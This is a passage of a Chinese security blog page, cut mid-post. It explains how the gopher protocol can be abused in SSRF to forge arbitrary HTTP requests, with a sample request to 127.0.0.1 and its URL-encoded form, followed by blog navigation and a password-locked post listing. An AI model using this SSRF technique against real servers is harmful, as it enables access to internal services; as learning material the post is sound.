<p>看起来有点像阉割版的nc，不过gopher会把传入的第一个字符给吞掉了，左边传入的是<code>123456789</code>，右边接收到的则是<code>23456789</code></p>
<p>在知道以上特性之后，便可以利用gopher协议来构造任意http请求了</p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf.php HTTP/1.1\r\n</span><br><span class="line">Host: 127.0.0.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>将其url编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%47%45%54%20%2f%73%73%72%66%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0d%0a</span><br></pre></td></tr></table></figure>
<p><img src="/./ssrf/9.png"><br><img src="/./ssrf/10.png"></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/web/">web</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/Web/">Web</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/SSRF/">SSRF</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-02-15  <a class="commentCountImg" href="/2023/02/15/%E6%9F%90%E6%B8%B8%E7%A7%81%E6%9C%8D%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E8%BF%87%E9%AA%8C%E8%AF%81/#comment-container"><span class="display-none-class">103c4ba01f2ca4a0d34d91d4aeda9a42</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="103c4ba01f2ca4a0d34d91d4aeda9a42">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>37 分钟  <i class="fas fa-pencil-alt"> </i>5.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/02/15/%E6%9F%90%E6%B8%B8%E7%A7%81%E6%9C%8D%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E8%BF%87%E9%AA%8C%E8%AF%81/">某游私服原理</a></h1><div class="content">Welcome to my blog, enter password to read.</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/frida/">frida</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/MITM/">MITM</a></div><hr></div><div class="level is-mobile is-flex"><div class="level-start"><div class="level-item"><a class="article-more button is-small size-small" href="/2023/02/15/%E6%9F%90%E6%B8%B8%E7%A7%81%E6%9C%8D%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E8%BF%87%E9%AA%8C%E8%AF%81/#more">阅读更多&gt;&gt;</a></div></div><div class="level-start"><div class="level-item has-text-grey is-size-7"><time datetime="2023-03-01T07:11:07.479Z"><i class="far fa-calendar-check"> 最后修改: </i>2023-03-01</time></div></div></div></article></div><!--!--><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="UPON-2021"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">UPON-2021</p><p class="is-size-6 is-block">游走于 web2 &amp; web3 的嘿阔 (很菜)</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">27</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/upon-2021" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/upon-2021/"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/%E8%AF%B6%E5%98%BF%EF%BC%9F"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="/%E5%96%B5%E5%96%B5%E5%96%B5%EF%BC%9F"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.google.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">谷歌</span></span><span class="level-right"><span class="level-item tag">www.google.com</span></span></a></li><li><a class="level is-mobile" href="https://www.baidu.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">百度</span></span><span class="level-right"><span class="level-item tag">www.baidu.com</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新评论</h3><span class="body_hot_comment">加载中，最新评论有1分钟缓存...</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-17T12:18:26.935Z">2023-06-17</time></p><p class="title"><a href="/2023/06/17/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8East%E7%9A%84python%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%80%9D%E8%B7%AF/">一次基于ast的python反混淆尝试</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-24T10:48:16.019Z">2023-04-24</time></p><p class="title"><a href="/2023/04/24/DasctfSU6%E6%9C%88%E8%B5%9B/">DasctfSU6月赛</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-14T10:47:06.210Z">2023-04-14</time></p><p class="title"><a href="/2023/04/14/Redos/">redos</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-08T00:52:11.314Z">2023-04-08</time></p><p class="title"><a href="/2023/04/08/Go%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Go编程学习记录</a></p><p class="categories"><a href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-05T05:58:02.820Z">2023-04-05</time></p><p class="title"><a href="/2023/04/05/ThinkPHP%E5%AD%A6%E4%B9%A0%E5%AF%84%E5%BD%95/">ThinkPHP框架 3.2.3学习记录</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/ssti/"><span class="level-start"><span class="level-item">ssti</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/weak/"><span class="level-start"><span class="level-item">weak</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"><span class="level-start"><span class="level-item">备忘录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">复现</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%BC%96%E7%A8%8B/"><span class="level-start"><span class="level-item">编程</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="level-start"><span class="level-item">路由器</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2023/06/"><span class="level-start"><span class="level-item">六月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2023/01/"><span class="level-start"><span class="level-item">一月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB/"><span class="tag">WEB</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%8D%E7%8E%B0/"><span class="tag">复现</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETH/"><span class="tag">ETH</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Solidity/"><span class="tag">Solidity</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ThinkPHP/"><span class="tag">ThinkPHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/upload/"><span class="tag">upload</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blockchain/"><span class="tag">Blockchain</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Crypto/"><span class="tag">Crypto</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DOS/"><span class="tag">DOS</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Go/"><span class="tag">Go</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Javascript/"><span class="tag">Javascript</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LFI/"><span class="tag">LFI</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MITM/"><span class="tag">MITM</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">1</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a><p class="size-small"><span>&copy; 2023 UPON2021</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！";
        }var now = new Date();setInterval("createTime('2022/9/29 17:30:00')", 250,"");</script><br></span><div class="size-small"><span></span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);})</script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(true){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('be835d1ee57b9ec974c1','5b2d7f351be105e013f11fa0ebde21cbea192152','UPON-2021','upon-2021.github.io',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>